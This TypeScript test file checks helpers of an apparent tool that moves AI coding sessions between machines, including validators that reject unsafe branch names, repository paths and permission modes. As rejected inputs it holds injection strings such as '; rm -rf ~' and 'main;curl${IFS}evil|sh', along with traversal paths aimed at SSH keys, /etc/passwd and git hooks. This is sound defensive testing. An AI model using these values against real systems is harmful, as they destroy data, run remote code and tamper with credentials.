import assert from "node:assert/strict";
import { test } from "node:test";
import {
  MOVE_ID,
  arrivalMode,
  arrivalRow,
  arrivedNoticeText,
  moveStepText,
  safeBranch,
  safeRepoPath,
  parseMovedTo,
  sameRemote,
} from "../../lib/session-move-types";
import { settledLine } from "../../lib/settle-types";

test("sameRemote: one repository, however its URL is written", () => {
  assert.ok(
    sameRemote(
      "git@github.com:elabx-org/agent-os.git",
      "https://github.com/elabx-org/agent-os"
    )
  );
  assert.ok(
    sameRemote(
      "ssh://git@github.com/Elabx-Org/agent-os.git",
      "https://github.com/elabx-org/agent-os.git/"
    )
  );
  assert.ok(sameRemote("/srv/git/repo.git", "/srv/git/repo"));
  assert.ok(
    !sameRemote(
      "https://github.com/elabx-org/agent-os",
      "https://github.com/saadnvd1/agent-os"
    )
  );
  assert.ok(!sameRemote(null, null));
  assert.ok(!sameRemote("https://github.com/a/b", null));
});

test("parseMovedTo: only a record that names a machine", () => {
  assert.equal(parseMovedTo(null), null);
  assert.equal(parseMovedTo("not json"), null);
  assert.equal(parseMovedTo("{}"), null);
  assert.equal(
    parseMovedTo(
      JSON.stringify({ machine: "m_0123456789ab", name: "Mac Studio", at: 1 })
    )?.name,
    "Mac Studio"
  );
});

test("settledLine: a moved session says where it went", () => {
  const moved = JSON.stringify({ machine: "hub", name: "the server", at: 1 });
  assert.equal(
    settledLine({
      settled_reason: "moved",
      pr_number: null,
      pr_status: null,
      moved_to: moved,
    }),
    "Continued on the server"
  );
  // Paused for a move that hasn't finished (or was cut off)
  assert.equal(
    settledLine({
      settled_reason: "moved",
      pr_number: null,
      pr_status: null,
      moved_to: null,
    }),
    "Paused to move"
  );
  assert.equal(
    settledLine({ settled_reason: "manual", pr_number: null, pr_status: null }),
    "Settled"
  );
});

test("the words of a move name the machine", () => {
  assert.equal(
    moveStepText("starting", "Mac Studio"),
    "Starting it on Mac Studio"
  );
  const notice = arrivedNoticeText(
    "Mac Studio",
    "macOS",
    "/Users/me/AgentOS/app",
    "the server",
    ["big.bin"]
  );
  assert.match(notice, /now runs on Mac Studio \(macOS\)/);
  assert.match(notice, /\/Users\/me\/AgentOS\/app/);
  assert.match(notice, /big\.bin/);
});

test("arrivedNoticeText: says when the machine can't reach the remote", () => {
  const say = (off?: boolean) =>
    arrivedNoticeText("Mac Studio", "macOS", "/r", "the server", [], off);
  assert.doesNotMatch(say(), /could not reach/);
  assert.match(
    say(true),
    /Mac Studio could not reach this repository's remote/
  );
});

test("arrivalRow: a session placed in a worktree works in that worktree", () => {
  const wt = {
    top: "/wt/app-main-abc123",
    branch: "main-server",
    worktree: true,
  };
  // At the repository's top
  assert.deepEqual(arrivalRow(wt, "/wt/app-main-abc123", null), {
    working_directory: "/wt/app-main-abc123",
    worktree_path: "/wt/app-main-abc123",
    branch_name: "main-server",
  });
  // In a subfolder: still that worktree, never Claude's own --worktree
  // (branch_name without worktree_path is what asks for that)
  const sub = arrivalRow(wt, "/wt/app-main-abc123/packages/web", null);
  assert.equal(sub.working_directory, "/wt/app-main-abc123/packages/web");
  assert.equal(sub.worktree_path, "/wt/app-main-abc123");
  // A fresh clone is a plain checkout
  assert.deepEqual(
    arrivalRow(
      { top: "/home/u/AgentOS/app", branch: "main", worktree: false },
      "/home/u/AgentOS/app",
      null
    ),
    {
      working_directory: "/home/u/AgentOS/app",
      worktree_path: null,
      branch_name: null,
    }
  );
});

test("arrivalMode: full access never arrives unasked", () => {
  assert.deepEqual(
    arrivalMode({ permissionMode: "bypassPermissions", autoApprove: false }),
    { mode: "auto", fullAccessOff: true }
  );
  assert.deepEqual(arrivalMode({ permissionMode: null, autoApprove: true }), {
    mode: "auto",
    fullAccessOff: true,
  });
  assert.deepEqual(
    arrivalMode({ permissionMode: "acceptEdits", autoApprove: false }),
    { mode: "acceptEdits", fullAccessOff: false }
  );
  // Junk from the other machine is no mode at all
  assert.deepEqual(
    arrivalMode({ permissionMode: "; rm -rf ~", autoApprove: false }),
    { mode: null, fullAccessOff: false }
  );
});

test("safeBranch and safeRepoPath: only plain names cross machines", () => {
  for (const ok of ["main", "feat/login-2", "release/1.2.x", "user@topic"]) {
    assert.ok(safeBranch(ok), ok);
  }
  for (const bad of [
    "main;curl${IFS}evil|sh",
    "feat/$(id)",
    "-x",
    "a b",
    "a..b",
    "it's",
    "",
    null,
  ]) {
    assert.ok(!safeBranch(bad), String(bad));
  }
  for (const ok of ["a.txt", "src/lib/x.ts", "docs/My File.md"]) {
    assert.ok(safeRepoPath(ok), ok);
  }
  for (const bad of [
    "../../.ssh/authorized_keys",
    "/etc/passwd",
    "a/../b",
    "a//b",
    ".git/config",
    "sub/.GIT/hooks/x",
    "a\\b",
    "",
  ]) {
    assert.ok(!safeRepoPath(bad), bad);
  }
  assert.ok(MOVE_ID.test("0123456789abcdef"));
  assert.ok(!MOVE_ID.test("../sessions/abc"));
});

test("moveStepText names the machine it leaves when that isn't this one", () => {
  assert.equal(moveStepText("pausing", "the server"), "Pausing it here");
  assert.equal(
    moveStepText("pausing", "the server", "Mac Studio"),
    "Pausing it on Mac Studio"
  );
});
